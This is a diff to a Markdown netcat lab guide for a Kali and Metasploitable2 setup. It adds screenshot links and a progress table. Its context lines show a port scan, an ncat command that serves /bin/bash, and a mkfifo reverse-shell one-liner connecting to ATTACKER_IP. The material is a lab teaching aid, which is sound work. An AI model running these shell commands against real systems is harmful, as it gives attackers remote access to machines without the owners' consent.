@@ -228,6 +228,8 @@ nc -z -v $TARGET_IP 1-1000
 
 🔍 **Output:** Shows which ports are open and responding.
 
+[📸 View Screenshot: Port Scan](screenshots/port_scan.png)
+
 ---
 
 ## Lab 2: Chat Between Kali and Metasploitable2
@@ -245,6 +247,8 @@ nc 192.168.56.102 4444
 ```
 
 🔍 **Result:** Type messages back and forth — confirms connectivity.
+
+- [📸 Chat Simulation](screenshots/chat_simulation.png)
 
 ---
 
@@ -272,6 +276,8 @@ sha256sum received.txt
 ```
 
 🔍 **Result:** `received.txt` should match `file.txt`.
+
+- [📸 File Transfer Result](screenshots/file_transfer.png)
 
 ---
 
@@ -304,6 +310,8 @@ ncat 192.168.56.101 4444 --exec "/bin/bash" --keep-open
 ```
 
 🔍 **Result:** Kali gets shell access to Metasploitable2 (in lab only).
+
+- [📸 Reverse Shell Session](screenshots/reverse_shell.png)
 
 ---
 
@@ -376,4 +384,19 @@ cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
 ## End notes
 - Replace placeholder IPs, ports, and filenames before running.  
 - Keep this document in your lab notes and update with observed behavior for your environment.
+
+
+
+### 📸 Screenshots for each lab are stored in `/screenshots/` with matching filenames.
+
+# Netcat Lab Progress
+
+| Lab | Status | Screenshot | Notes |
+|-----|--------|------------|-------|
+| Port Scan | ✅ Done | ✅ | Basic TCP scan |
+| Chat | ✅ Done | ✅ | Bi-directional |
+| File Transfer | ✅ Done | ✅ | Hash verified |
+| Reverse Shell | ⚠️ In Progress | ❌ | Testing mkfifo |
+
+
 
